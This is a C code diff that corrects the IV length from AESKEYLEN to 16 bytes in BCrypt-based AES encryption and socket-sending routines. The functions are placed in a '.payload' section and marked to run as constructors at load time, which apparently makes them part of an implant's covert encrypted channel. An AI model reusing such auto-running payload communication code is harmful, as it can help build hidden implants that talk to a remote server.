@@ -374,7 +374,7 @@ __attribute__((constructor(102), section(".payload"))) int InitSecureComs(){
 	/*
 	 * Allocate space for the IV and key
 	 */
-	SessionIV = CryptMemAlloc(AESKEYLEN);
+	SessionIV = CryptMemAlloc(16);
 	SessionKEY = CryptMemAlloc(AESKEYLEN);
 	/*
 	 * Define a algorithm handle for a cryptographically secure 
@@ -400,7 +400,7 @@ __attribute__((constructor(102), section(".payload"))) int InitSecureComs(){
 		exit(0);
 	}
 	
-	if (!BCRYPT_SUCCESS(BCryptGenRandom(randNumProv, (PUCHAR)(SessionIV), AESKEYLEN, 0)))
+	if (!BCRYPT_SUCCESS(BCryptGenRandom(randNumProv, (PUCHAR)(SessionIV), 16, 0)))
 	{
 		printf("error generating random number");
 		exit(0);
@@ -490,7 +490,7 @@ __attribute__((constructor(102), section(".payload"))) int InitSecureComs(){
 		exit(-1);
 	}
 	
-	if(!send(Connection,(BYTE*)SessionIV, AESKEYLEN,0))
+	if(!send(Connection,(BYTE*)SessionIV, 16,0))
 	{
 		exit(-1);
 	}
@@ -539,17 +539,17 @@ __attribute__((section(".payload"))) int send_secure(BYTE* sendBuffer, ULONG buf
 	{
 		return 0;
 	}
-	MSG = CryptMemAlloc(EncryptedBufferLen + AESKEYLEN);
-	EncryptedBuffer = MSG+AESKEYLEN;
+	MSG = CryptMemAlloc(EncryptedBufferLen + 16);
+	EncryptedBuffer = MSG+16;
 	 
-	if(BCryptEncrypt(SessionKeyHandle,sendBuffer,bufferLen,NULL, SessionIV,AESKEYLEN,EncryptedBuffer,EncryptedBufferLen,&EncryptedBufferWriteLen,0) != STATUS_SUCCESS)
+	if(BCryptEncrypt(SessionKeyHandle,sendBuffer,bufferLen,NULL, SessionIV,16,EncryptedBuffer,EncryptedBufferLen,&EncryptedBufferWriteLen,0) != STATUS_SUCCESS)
 	{
 		return 0;
 	}
-	for(int x = 0; x < AESKEYLEN; x++){
+	for(int x = 0; x < 16; x++){
 		*(MSG+x) = *(SessionIV+x); 
 	}
-	msgSZ = htonl(EncryptedBufferWriteLen+AESKEYLEN);
+	msgSZ = htonl(EncryptedBufferWriteLen+16);
 	
 	/*
 	 * Send the length of the encrypted AES key to the server.
